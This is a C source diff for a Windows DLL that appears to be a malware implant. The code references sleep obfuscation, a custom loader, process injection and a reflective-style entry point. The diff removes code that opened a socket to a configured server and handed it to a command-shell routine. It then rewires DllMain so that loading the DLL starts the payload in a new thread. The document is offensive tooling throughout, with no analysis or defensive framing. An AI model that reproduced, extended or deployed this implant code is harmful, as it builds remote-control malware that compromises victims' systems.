@@ -10,8 +10,6 @@
 #include "sleaping.h"
 #include <stdint.h>
 #include "net.h"
-#include "utils.h"
-#include "file.h"
 #include "dll_headers.h"
 #include "ldr.h"
 
@@ -616,21 +614,7 @@ EXTERN_DLL_EXPORT bool yolo()
 	return TRUE;
 }
 
-static SOCKET connect_to_server(winsock_functions_t* ws_funcs, kernel32_functions_t* krnl_funcs)
-{
-	SOCKET socket = INVALID_SOCKET;
-
-	socket = init_connection(SERVER_HOSTNAME, SERVER_PORT, ws_funcs);
-	if (socket == INVALID_SOCKET)
-	{
-		cleanup_wsa(ws_funcs);
-	}
-
-	return socket;
-}
-
-
-static status_t custom_process_attach(HMODULE hModule)
+static status_t rf_entrypoint(HMODULE hModule)
 {
 	status_t status = 0;
 	sleaping_para_t sleaping_para = { 0 };
@@ -712,42 +696,16 @@ static status_t custom_process_attach(HMODULE hModule)
 	//inject(&nt_funcs, str_target);
 
 
-
-
-//	global_functions_t global_functions = { 0 };
-//
-//	if (!load_winsock_functions(&global_functions.ws2))
-//	{
-//		return ST_ERROR;
-//	}
-//	
-//	if (!load_gdi32_functions(&global_functions.gdi32))
-//	{
-//		return ST_ERROR;
-//	}
-//
-//
-//	if (startup_wsa(&global_functions.ws2) != 0)
-//	{
-//		return ST_ERROR;
-//	}
-//
-//	SOCKET socket = INVALID_SOCKET;
-//
-//	socket = init_connection(SERVER_HOSTNAME, SERVER_PORT, &global_functions.ws2);
-//	if (socket == INVALID_SOCKET)
-//	{
-//		cleanup_wsa(&global_functions.ws2);
-//		return ST_SOCKET_ERROR;
-//	}
-//
-//	status = win_cmd(socket);
-//	
-//
-//__cleanup_0:
-//	cleanup_wsa(&global_functions.ws2);
-
 	return status;
+}
+
+extern status_t process_entrypoint(HMODULE hModule);
+
+DWORD WINAPI process_entrypoint_thread(LPVOID lpParameter)
+{
+    HMODULE hModule = (HMODULE)lpParameter;
+    status_t st = process_entrypoint(hModule);
+    return (DWORD)st; // 确保 status_t 可转换为 DWORD
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule,
@@ -756,22 +714,24 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 )
 {
 
-	if (ul_reason_for_call == 1)
-	{
-		return custom_process_attach(hModule);
-	}
-
-	return TRUE;
-
-	//switch (ul_reason_for_call)
+	//if (ul_reason_for_call == 1 && lpReserved == (void*)1)
 	//{
-	//case DLL_PROCESS_ATTACH:
-	//	return custom_process_attach(hModule);
-	//case DLL_THREAD_ATTACH:
-	//case DLL_THREAD_DETACH:
-	//case DLL_PROCESS_DETACH:
-	//	break;
+	//	return rf_entrypoint(hModule);
 	//}
+
 	//return TRUE;
+
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		CreateThread(0, 0, process_entrypoint_thread, (LPVOID)hModule, 0, 0);
+		//return process_entrypoint(hModule);
+		//return rf_entrypoint(hModule);
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
 }
 
